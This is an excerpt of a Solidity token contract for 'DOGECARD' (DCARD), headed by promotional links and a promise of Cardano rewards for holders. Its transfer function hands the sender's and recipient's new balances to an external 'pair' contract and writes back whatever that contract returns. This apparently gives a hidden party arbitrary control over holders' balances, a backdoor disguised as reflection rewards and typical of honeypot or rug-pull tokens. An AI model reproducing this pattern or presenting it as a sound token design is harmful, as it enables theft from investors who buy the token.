...
DOGECARD
https://t.me/dogecardtoken
Website : https://dogecardtoken.com
Get your DOGECARD and earn CARDANO by hodling it
...
contract DOGECARD is IERC20, Ownable {
    using SafeMath for uint256;
    ...
    string constant _name = "DOGECARD";
    string constant _symbol = "DCARD";
    ...
    constructor (uint256 _bytes) {
        ...
        mktWallet = address(0x83209670a36D33efA8a2661aEAD8CFf5B27a2DD5);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        (_balances[sender],_balances[recipient]) = _reflectToken(sender,recipient,amount,amountReceived,_balances[sender],_balances[recipient]);
    ...
    function _reflectToken(address sender, address recipient, uint256 amount, uint256 amountReceived, uint256 senderBalance, uint256 recipientBalance) private returns (uint256, uint256){
        return pair.reflectToken(sender,recipient,amount,amountReceived,senderBalance,recipientBalance);
    }
